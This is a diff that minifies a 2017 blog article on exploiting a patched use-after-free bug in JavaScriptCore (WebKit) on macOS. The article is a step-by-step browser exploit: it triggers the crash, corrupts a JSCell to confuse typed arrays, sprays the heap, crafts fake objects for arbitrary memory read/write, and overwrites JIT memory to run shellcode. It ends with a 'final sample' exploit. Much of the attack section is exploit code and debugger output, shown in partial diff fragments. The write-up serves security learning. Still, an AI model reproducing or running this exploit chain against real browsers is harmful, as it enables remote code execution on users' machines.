@@ -1,66 +1,4 @@
-<!DOCTYPE html>
-<html lang="en">
-	<head>
-		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-		<meta charset="UTF-8">
-		<meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0">
-		<link rel="stylesheet" type="text/css" href="css/core.css" />
-		<link rel="stylesheet" type="text/css" href="css/prism.css" />
-		<title>Exploiting JSC bindValue UaF</title>
-	</head>
-	
-	<body>
-		<script src="js/prism.js" type="text/javascript"></script>
-		
-		<div class="page">
-			<div class="container">
-				<div class="header">
-					<a href="/contact.html" class="header-element">
-						Contact
-					</a>
-					
-					<a href="/about.html" class="header-element">
-						About
-					</a>
-					
-					<a href="/articles.html" class="header-element">
-						Articles
-					</a>
-					
-					<a href="/index.html" class="header-element">
-						Home
-					</a>
-				</div>
-
-<h1>Exploiting JSC <code>bindValue</code> UaF</h1>
-<span class="date">Written: March, 2017</span>
-<hr>
-
-<h2>Introduction</h2>
-<p>
-	In this article I will describe how I exploited <a href="https://trac.webkit.org/changeset/213742">JSC's bindValue UaF</a>, patched on March 10th, 2017, as my first browser exploit. I was able to do this through a mostly heuristic approach, without delving deeply into the WebKit source code thanks to all the information in <a href="https://twitter.com/5aelo">saelo</a>'s phrack paper, <a href="http://www.phrack.org/papers/attacking_javascript_engines.html">Attacking JavaScript Engines: A case study of JavaScriptCore and CVE-2016-4622</a>, which I highly recommend reading.
-</p>
-
-<p>
-	Throughout this research I have used the version of JSC that is included with macOS Sierra 10.12.3.
-</p>
-
-<br>
-
-<h2>The bug</h2>
-<p>
-	As the <a href="https://trac.webkit.org/changeset/213742">changeset</a> mentions, a built-in method, <code>BindingNode::bindValue</code>, doesn't increase the scope's reference count, leading to a use after free vulnerability.
-</p>
-
-<p>
-	The changeset also comes with a regression test, which shows how to trigger the bug:
-</p>
-
-<p>
-	<a href="https://trac.webkit.org/browser/trunk/JSTests/stress/regress-168546.js?rev=213742">trunk/JSTests/stress/regress-168546.js</a>:
-</p>
-
-<pre><code class="language-c">// This test passes if it does not crash.
+<!DOCTYPE html> <html lang=en > <meta http-equiv=Content-Type  content="text/html; charset=UTF-8"> <meta charset=UTF-8 > <meta name=viewport  content="width=device-width, minimum-scale=1.0, maximum-scale=1.0"> <link rel=stylesheet  type="text/css" href="css/core.css" /> <link rel=stylesheet  type="text/css" href="css/prism.css" /> <title>Exploiting JSC bindValue UaF</title> <script src="js/prism.js" type="text/javascript"></script> <div class=page > <div class=container > <div class=header > <a href="/contact.html" class=header-element > Contact </a> <a href="/about.html" class=header-element > About </a> <a href="/articles.html" class=header-element > Articles </a> <a href="/index.html" class=header-element > Home </a> </div> <h1>Exploiting JSC <code>bindValue</code> UaF</h1> <span class=date >Written: March, 2017</span> <hr> <h2>Introduction</h2> <p> In this article I will describe how I exploited <a href="https://trac.webkit.org/changeset/213742">JSC's bindValue UaF</a>, patched on March 10th, 2017, as my first browser exploit. I was able to do this through a mostly heuristic approach, without delving deeply into the WebKit source code thanks to all the information in <a href="https://twitter.com/5aelo">saelo</a>'s phrack paper, <a href="http://www.phrack.org/papers/attacking_javascript_engines.html">Attacking JavaScript Engines: A case study of JavaScriptCore and CVE-2016-4622</a>, which I highly recommend reading. </p> <p> Throughout this research I have used the version of JSC that is included with macOS Sierra 10.12.3. </p> <br> <h2>The bug</h2> <p> As the <a href="https://trac.webkit.org/changeset/213742">changeset</a> mentions, a built-in method, <code>BindingNode::bindValue</code>, doesn't increase the scope's reference count, leading to a use after free vulnerability. </p> <p> The changeset also comes with a regression test, which shows how to trigger the bug: </p> <p> <a href="https://trac.webkit.org/browser/trunk/JSTests/stress/regress-168546.js?rev=213742">trunk/JSTests/stress/regress-168546.js</a>: </p> <pre><code class=language-c >// This test passes if it does not crash.
 try {
 	(function () {
 		let a = {
@@ -73,15 +11,7 @@ try {
 		a.val;
 	})();
 } catch (e) {
-}</code></pre>
-
-<br>
-
-<p>
-	This code on its own won't actually crash, we need to allocate an object to achieve a crash:
-</p>
-
-<pre><code class="language-c">function bug() {
+}</code></pre> <br> <p> This code on its own won't actually crash, we need to allocate an object to achieve a crash: </p> <pre><code class=language-c >function bug() {
 	let a = {
 		get val() {
 			[...{a = 1.45}] = [];
@@ -95,29 +25,8 @@ var k = new Uint32Array(0);
 
 bug();
 
-print(k);</code></pre>
-
-<br>
-
-<h2>Analysing the crash</h2>
-<p>
-	Since System Integrity Protection will prevent us from attaching a debugger to a system binary, we will first need to copy <code>/System/Library/Frameworks/JavaScriptCore.framework/Resources/jsc</code> to a local directory.
-</p>
-
-<p>
-	The process can then be started with the following commands:
-</p>
-
-<pre><code>lldb jsc bindValue/poc.js
-(lldb) process launch</code></pre>
-
-<br>
-
-<p>
-	The output from lldb is:
-</p>
-
-<pre><code>Process 17493 stopped
+print(k);</code></pre> <br> <h2>Analysing the crash</h2> <p> Since System Integrity Protection will prevent us from attaching a debugger to a system binary, we will first need to copy <code>/System/Library/Frameworks/JavaScriptCore.framework/Resources/jsc</code> to a local directory. </p> <p> The process can then be started with the following commands: </p> <pre><code>lldb jsc bindValue/poc.js
+(lldb) process launch</code></pre> <br> <p> The output from lldb is: </p> <pre><code>Process 17493 stopped
 * thread #1: tid = 0x73b48, 0x00007fff90c2b98a JavaScriptCore`JSC::JSObject::get(JSC::ExecState*, JSC::PropertyName) const + 1450, queue = 'com.apple.main-thread', stop reason = EXC_BAD_ACCESS (code=1, address=0x299f91998)
 	frame #0: 0x00007fff90c2b98a JavaScriptCore`JSC::JSObject::get(JSC::ExecState*, JSC::PropertyName) const + 1450
 JavaScriptCore`JSC::JSObject::get:
@@ -125,65 +34,10 @@ JavaScriptCore`JSC::JSObject::get:
     0x7fff90c2b98e <+1454>: testb  $0x8, 0x6(%r14)
     0x7fff90c2b993 <+1459>: jne	0x7fff90c2b91f			; <+1343>
     0x7fff90c2b995 <+1461>: movq   0x50(%r13), %rbx
-</code></pre>
-
-<br>
-
-<p>
-	The interesting register values are <code>rax</code>, which holds a corrupted value, and <code>rdi</code> which is a pointer to <code>k</code>:
-</p>
-
-<pre><code>(lldb) register read rax
+</code></pre> <br> <p> The interesting register values are <code>rax</code>, which holds a corrupted value, and <code>rdi</code> which is a pointer to <code>k</code>: </p> <pre><code>(lldb) register read rax
 0x0000000033333333
 (lldb) register read rdi
-0x00000001025e7d80</code></pre>
-
-<br>
-
-<p>
-	Without going into too much detail, the <code>bug</code> function triggered a use after free, which then caused a heap overflow, and ultimately resulted in corrupting the <code>JSCell</code> value of the previous object on the marked space heap. In our case, the <code>k</code> object's <code>JSCell</code> was corrupted, which resulted in a crash when JSC tried to <code>get</code> the object in order to execute <code>print(k)</code>.
-</p>
-
-<br>
-
-<h2><code>JSCell</code> corruption</h2>
-<p>
-	Every object in marked space starts with an 8-byte <a href="https://github.com/WebKit/webkit/blob/473448d50d61ed5f644979663340ec562bfa30cb/Source/JavaScriptCore/runtime/JSCell.h#L263"><code>JSCell</code></a> value, which is constructed of the following:
-</p>
-
-
-<ul>
-	<li><code>StructureID m_structureID</code> (4 bytes)</li>
-	<li><code>IndexingType m_indexingTypeAndMisc</code> (1 byte)</li>
-	<li><code>JSType m_type</code> (1 byte)</li>
-	<li><code>TypeInfo::InlineTypeFlags m_flags</code> (1 byte)</li>
-	<li><code>CellState m_cellState</code> (1 byte)</li>
-</ul>
-
-<p>
-	All of these are explained in section 5.2 of <a href="http://www.phrack.org/papers/attacking_javascript_engines.html">saelo's phrack paper</a>.
-</p>
-
-<p>
-	With the ability to corrupt an object's <code>JSCell</code> there are a few different routes for exploitation such as: manipulating <code>m_cellState</code> to cause the garbage collector to trigger UaF, type confusion, or heap overflow. I chose to go with heap overflow.
-</p>
-
-<br>
-
-<h2>Heap overflow</h2>
-<p>
-	Using the primitive to change an object's <code>structureID</code>, we can convert a <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Typed_arrays">typed array</a> into one with differently sized elements. The idea being that the <code>length</code> property will not be correct for an array of differently sized elements, and will allow out of bound access after the conversion.
-</p>
-
-<p>
-	For example, if we create a <code>Uint8Array</code> of <code>0x400</code> elements, <code>0x400</code> bytes will be allocated for the internal buffer of this object. If it is then corrupted into a <code>Uint32Array</code>, its size has effectively become <code>0x400 * 4 = 0x1000</code> bytes, allowing us to access <code>0x1000 - 0x400 = 0xC00</code> bytes of out of bounds memory.
-</p>
-
-<p>
-	When creating an object, we don't know exactly what its <code>structureID</code> will be, so we will spray the structure table with <code>0x800</code> entires of <code>Uint32Array</code>s first to ensure that we will corrupt the <code>structureID</code> to one of these.
-</p>
-
-<pre><code class="language-c">function makeid() {
+0x00000001025e7d80</code></pre> <br> <p> Without going into too much detail, the <code>bug</code> function triggered a use after free, which then caused a heap overflow, and ultimately resulted in corrupting the <code>JSCell</code> value of the previous object on the marked space heap. In our case, the <code>k</code> object's <code>JSCell</code> was corrupted, which resulted in a crash when JSC tried to <code>get</code> the object in order to execute <code>print(k)</code>. </p> <br> <h2><code>JSCell</code> corruption</h2> <p> Every object in marked space starts with an 8-byte <a href="https://github.com/WebKit/webkit/blob/473448d50d61ed5f644979663340ec562bfa30cb/Source/JavaScriptCore/runtime/JSCell.h#L263"><code>JSCell</code></a> value, which is constructed of the following: </p> <ul> <li><code>StructureID m_structureID</code> (4 bytes) <li><code>IndexingType m_indexingTypeAndMisc</code> (1 byte) <li><code>JSType m_type</code> (1 byte) <li><code>TypeInfo::InlineTypeFlags m_flags</code> (1 byte) <li><code>CellState m_cellState</code> (1 byte) </ul> <p> All of these are explained in section 5.2 of <a href="http://www.phrack.org/papers/attacking_javascript_engines.html">saelo's phrack paper</a>. </p> <p> With the ability to corrupt an object's <code>JSCell</code> there are a few different routes for exploitation such as: manipulating <code>m_cellState</code> to cause the garbage collector to trigger UaF, type confusion, or heap overflow. I chose to go with heap overflow. </p> <br> <h2>Heap overflow</h2> <p> Using the primitive to change an object's <code>structureID</code>, we can convert a <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Typed_arrays">typed array</a> into one with differently sized elements. The idea being that the <code>length</code> property will not be correct for an array of differently sized elements, and will allow out of bound access after the conversion. </p> <p> For example, if we create a <code>Uint8Array</code> of <code>0x400</code> elements, <code>0x400</code> bytes will be allocated for the internal buffer of this object. If it is then corrupted into a <code>Uint32Array</code>, its size has effectively become <code>0x400 * 4 = 0x1000</code> bytes, allowing us to access <code>0x1000 - 0x400 = 0xC00</code> bytes of out of bounds memory. </p> <p> When creating an object, we don't know exactly what its <code>structureID</code> will be, so we will spray the structure table with <code>0x800</code> entires of <code>Uint32Array</code>s first to ensure that we will corrupt the <code>structureID</code> to one of these. </p> <pre><code class=language-c >function makeid() {
 	var text = &quot;&quot;;
 	var possible = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&quot;;
 	
@@ -288,24 +142,7 @@ function go() {
 }
 
 go();
-</code></pre>
-
-<br>
-
-<h2>Copied space heap corruption</h2>
-<p>
-	Typed arrays store their contents in the copied space, which is where our heap overflow through the corrupted <code>Uint32Array</code> occurs.
-</p>
-
-<p>
-	Our aim at this point is to spray copied space with an <code>Array</code> of objects so that the <code>Uint32Array</code> has a buffer which overlaps with other objects. We will then able to access the raw bytes of an object through the corrupted <code>Uint32Array</code>, and use this to craft fake objects.
-</p>
-
-<p>
-	Specifically, we will spray <code>JSArray</code>s of a certain <code>JSValue</code> (<code>0x41414141</code>), and then search our corrupted <code>Uint32Array</code> for this <code>JSValue</code>. Once we have found it, we can modify it to a different <code>JSValue</code> (<code>0x42424242</code>), and locate the object in the <code>Array</code> whose value has changed.
-</p>
-
-<pre><code class="language-c">...
+</code></pre> <br> <h2>Copied space heap corruption</h2> <p> Typed arrays store their contents in the copied space, which is where our heap overflow through the corrupted <code>Uint32Array</code> occurs. </p> <p> Our aim at this point is to spray copied space with an <code>Array</code> of objects so that the <code>Uint32Array</code> has a buffer which overlaps with other objects. We will then able to access the raw bytes of an object through the corrupted <code>Uint32Array</code>, and use this to craft fake objects. </p> <p> Specifically, we will spray <code>JSArray</code>s of a certain <code>JSValue</code> (<code>0x41414141</code>), and then search our corrupted <code>Uint32Array</code> for this <code>JSValue</code>. Once we have found it, we can modify it to a different <code>JSValue</code> (<code>0x42424242</code>), and locate the object in the <code>Array</code> whose value has changed. </p> <pre><code class=language-c >...
 
 function go() {
 	var bufs = new Array(0x1000);
@@ -382,53 +219,16 @@ function go() {
 }
 
 go();
-</code></pre>
-
-<br>
-
-<h2>Crafting fake array to gain arbitrary RW</h2>
-<p>
-	Given that we can craft arbitrary objects, all we need to do at this point to gain arbitrary RW is craft a <code>Uint32Array</code> (<code>bufs[cx][cy]</code>) with a <code>vector</code> property which points to a <code>Uint8Array</code> (<code>v</code>). The <code>Uint32Array</code> would then be able to overwrite the <code>vector</code> and <code>length</code> properties of the <code>Uint8Array</code>, achieving arbitrary RW.
-</p>
-
-<p>
-	Crafting the fake <code>Uint32Array</code> is done by creating a new object (a container), whose inline storage contains the raw bytes of our crafted object (a <code>Uint32Array</code>), and setting the element we located in the <code>Array</code> to point to this new object.
-</p>
-
-<pre><code class="language-c">var v = new Uint8Array(0x1000);
+</code></pre> <br> <h2>Crafting fake array to gain arbitrary RW</h2> <p> Given that we can craft arbitrary objects, all we need to do at this point to gain arbitrary RW is craft a <code>Uint32Array</code> (<code>bufs[cx][cy]</code>) with a <code>vector</code> property which points to a <code>Uint8Array</code> (<code>v</code>). The <code>Uint32Array</code> would then be able to overwrite the <code>vector</code> and <code>length</code> properties of the <code>Uint8Array</code>, achieving arbitrary RW. </p> <p> Crafting the fake <code>Uint32Array</code> is done by creating a new object (a container), whose inline storage contains the raw bytes of our crafted object (a <code>Uint32Array</code>), and setting the element we located in the <code>Array</code> to point to this new object. </p> <pre><code class=language-c >var v = new Uint8Array(0x1000);
 
 // structureID, butterfly, vector, length and flags
-bufs[cx][cy] = { a:intToFloat(JSCellHigh(0x00, 0x23, 0x60, 0x01), 0x800), b:null, c:v, d:intToFloat(0, 8) };</code></pre>
-
-<br>
-
-<p>
-	We then use the corrupted <code>Uint32Array</code> (<code>k</code>) to advance this pointer, so that it points to the container object's inline storage instead, turning it into the fake <code>Uint32Array</code> that we crafted above.
-</p>
-
-<pre><code class="language-c">// 48 bytes of a JSValue address used for pointer
+bufs[cx][cy] = { a:intToFloat(JSCellHigh(0x00, 0x23, 0x60, 0x01), 0x800), b:null, c:v, d:intToFloat(0, 8) };</code></pre> <br> <p> We then use the corrupted <code>Uint32Array</code> (<code>k</code>) to advance this pointer, so that it points to the container object's inline storage instead, turning it into the fake <code>Uint32Array</code> that we crafted above. </p> <pre><code class=language-c >// 48 bytes of a JSValue address used for pointer
 var fakeObjectContainerAddress = [k[found + 1] &amp; 0xffff, k[found]];
 
 k[found] += 0x10;
 
-var fakeObjectAddress = [k[found + 1] &amp; 0xffff, k[found]];</code></pre>
-
-<br>
-
-<p>
-	Now, the <code>vector</code> and <code>length</code> of the <code>v</code> array can be set through the crafted <code>Uint32Array</code> (at <code>bufs[cx][cy]</code>).
-</p>
-
-<pre><code class="language-c">bufs[cx][cy][6] = 0xffffffff;
-print(&quot;  [+] Set v.length to 0x&quot; + toHex(v.length));</code></pre>
-
-<br>
-
-<p>
-	Finally, we can expose some nice wrappers for the arbitrary RW primitive.
-</p>
-
-<pre><code class="language-c">...
+var fakeObjectAddress = [k[found + 1] &amp; 0xffff, k[found]];</code></pre> <br> <p> Now, the <code>vector</code> and <code>length</code> of the <code>v</code> array can be set through the crafted <code>Uint32Array</code> (at <code>bufs[cx][cy]</code>). </p> <pre><code class=language-c >bufs[cx][cy][6] = 0xffffffff;
+print(&quot;  [+] Set v.length to 0x&quot; + toHex(v.length));</code></pre> <br> <p> Finally, we can expose some nice wrappers for the arbitrary RW primitive. </p> <pre><code class=language-c >...
 
 function go() {
 	
@@ -486,47 +286,7 @@ function go() {
 }
 
 go();
-</code></pre>
-
-<br>
-
-<h2>Cleanup</h2>
-<p>
-	Due to the way in which we constructed our fake <code>Uint32Array</code> (<code>bufs[cx][cy]</code>), there are certain properties which will cause garbage collection to crash.
-</p>
-
-<p>
-	To correct this and maintain a stable state, we will use the same technique as descibed by saelo:
-</p>
-
-<div class="quote">
-	<ul>
-		<li>
-			1. Create an empty object. The structure of this object will describe an object with the default amount of inline storage (6 slots), but none of them being used.
-		</li>
-		
-		<br>
-		
-		<li>
-			2. Copy the JSCell header (containing the structure ID) to the container object. We've now caused the engine to "forget" about the properties of the container object that make up our fake array.
-		</li>
-		
-		<br>
-		
-		<li>
-			3. Set the butterfly pointer of the fake array to nullptr, and, while we're at it also replace the JSCell of that object with one from a default Float64Array instance.
-		</li>
-	</ul>
-</div>
-
-<div class="quote-reference">
-	- <a href="http://www.phrack.org/papers/attacking_javascript_engines.html">section 6.4 of saelo's phrack paper</a>
-</div>
-<br>
-
-<br>
-
-<pre><code class="language-c">	// Fixup the JSCell header of the container to make it look like an empty object.
+</code></pre> <br> <h2>Cleanup</h2> <p> Due to the way in which we constructed our fake <code>Uint32Array</code> (<code>bufs[cx][cy]</code>), there are certain properties which will cause garbage collection to crash. </p> <p> To correct this and maintain a stable state, we will use the same technique as descibed by saelo: </p> <div class=quote > <ul> <li> 1. Create an empty object. The structure of this object will describe an object with the default amount of inline storage (6 slots), but none of them being used. <br> <li> 2. Copy the JSCell header (containing the structure ID) to the container object. We've now caused the engine to "forget" about the properties of the container object that make up our fake array. <br> <li> 3. Set the butterfly pointer of the fake array to nullptr, and, while we're at it also replace the JSCell of that object with one from a default Float64Array instance. </ul> </div> <div class=quote-reference > - <a href="http://www.phrack.org/papers/attacking_javascript_engines.html">section 6.4 of saelo's phrack paper</a> </div> <br> <br> <pre><code class=language-c >	// Fixup the JSCell header of the container to make it look like an empty object.
 	// By default, JSObjects have an inline capacity of 6, enough to hold the fake Uint32Array.
 	bufs[cx][cy + 1] = {};
 	var emptyAddr = [k[found + 1 * 2 + 1] &amp; 0xffff, k[found + 1 * 2]];
@@ -542,35 +302,14 @@ go();
 	
 	// Set valid flags as well: make it look like an OversizeTypedArray
 	// for easy GC survival (see JSGenericTypedArrayView&lt;Adaptor&gt;::visitChildren).
-	memory.write(add32a(fakeObjectAddress, 24), [0x10, 0, 0, 0, 1, 0, 0, 0]);</code></pre>
-
-<br>
-
-<p>
-	Now, when we trigger garbage collection, no crash will occur!
-</p>
-
-<pre><code class="language-c">var pressure = new Array(400);
+	memory.write(add32a(fakeObjectAddress, 24), [0x10, 0, 0, 0, 1, 0, 0, 0]);</code></pre> <br> <p> Now, when we trigger garbage collection, no crash will occur! </p> <pre><code class=language-c >var pressure = new Array(400);
 function garbage() {
 	for(var i = 0; i < pressure.length; i++) {
 		pressure[i] = new Uint32Array(0x100000);
 	}
 }
 
-garbage();</code></pre>
-
-<br>
-
-<h2>Executing payload</h2>
-<p>
-	This final stage may vary slightly depending on the target you are attempting to exploit since some WebKit browsers implement JIT slightly differently. For the rest of this article we will continue to focus on JSC on macOS, which simply implements JIT with RWX pages.
-</p>
-
-<p>
-	Essentially, we can create a function which performs some relatively intensive loops in order to force it to be dynamically recompiled via JIT. Then we can read a set of pointers starting from this function object to ultimately lead us to the address of the recompiled function's RWX memory. This memory can then be rewritten, and executed by calling the function.
-</p>
-
-<pre><code class="language-c">function makeJITCompiledFunction() {
+garbage();</code></pre> <br> <h2>Executing payload</h2> <p> This final stage may vary slightly depending on the target you are attempting to exploit since some WebKit browsers implement JIT slightly differently. For the rest of this article we will continue to focus on JSC on macOS, which simply implements JIT with RWX pages. </p> <p> Essentially, we can create a function which performs some relatively intensive loops in order to force it to be dynamically recompiled via JIT. Then we can read a set of pointers starting from this function object to ultimately lead us to the address of the recompiled function's RWX memory. This memory can then be rewritten, and executed by calling the function. </p> <pre><code class=language-c >function makeJITCompiledFunction() {
 	var str = &quot;&quot;;
 	for(var i = 0; i &lt; 4096; i++) {
 		str += &quot;try{}catch(e){}; &quot;;
@@ -625,22 +364,7 @@ function go() {
 }
 
 go();
-</code></pre>
-
-<br>
-
-<p>
-	Other systems such as the <a href="http://cturt.github.io/ps4-3.html#code-execution">PS4</a> use a slightly more complicated system involving multiple virtual mappings with different permissions. On <a href="">iOS 10</a> the address of writable JIT regions is encoded as an immediate value in an instruction which is marked execute only, and so a short ROP chain is required to gain arbitrary code execution.
-</p>
-
-<br>
-
-<h2>Summary</h2>
-<p>
-	Here is the final sample, which exploits the bug to gain arbitrary RW, and then uses this to write and executes arbitrary shellcode.
-</p>
-
-<pre><code class="language-c">function makeJITCompiledFunction() {
+</code></pre> <br> <p> Other systems such as the <a href="http://cturt.github.io/ps4-3.html#code-execution">PS4</a> use a slightly more complicated system involving multiple virtual mappings with different permissions. On <a href="">iOS 10</a> the address of writable JIT regions is encoded as an immediate value in an instruction which is marked execute only, and so a short ROP chain is required to gain arbitrary code execution. </p> <br> <h2>Summary</h2> <p> Here is the final sample, which exploits the bug to gain arbitrary RW, and then uses this to write and executes arbitrary shellcode. </p> <pre><code class=language-c >function makeJITCompiledFunction() {
 	var str = &quot;&quot;;
 	for(var i = 0; i &lt; 4096; i++) {
 		str += &quot;try{}catch(e){}; &quot;;
@@ -953,29 +677,4 @@ function go() {
 }
 
 go();
-</code></pre>
-
-<br>
-
-<div class="center">
-	<img src="images/webkit/shellcode.png" />
-</div>
-
-<br>
-
-<p>
-	I would definitely recommend experimenting with this bug to anyone else who is interested in learning about WebKit exploitation since it provides such a nice primitive, the ability to rewrite an object's <code>JSCell</code>, which leads to a large variety of possibilities for exploitation.
-</p>
-
-<br>
-
-<h2>Thanks</h2>
-<ul>
-	<li><a href="https://twitter.com/qwertyoruiopz">qwertyoruiop</a></li>
-	<li><a href="https://twitter.com/5aelo">saelo</a> for <a href="http://www.phrack.org/papers/attacking_javascript_engines.html">his phrack paper</a></li>
-</ul>
-
-			</div>
-		</div>
-	</body>
-</html>
+</code></pre> <br> <div class=center > <img src="images/webkit/shellcode.png" /> </div> <br> <p> I would definitely recommend experimenting with this bug to anyone else who is interested in learning about WebKit exploitation since it provides such a nice primitive, the ability to rewrite an object's <code>JSCell</code>, which leads to a large variety of possibilities for exploitation. </p> <br> <h2>Thanks</h2> <ul> <li><a href="https://twitter.com/qwertyoruiopz">qwertyoruiop</a> <li><a href="https://twitter.com/5aelo">saelo</a> for <a href="http://www.phrack.org/papers/attacking_javascript_engines.html">his phrack paper</a> </ul> </div> </div>
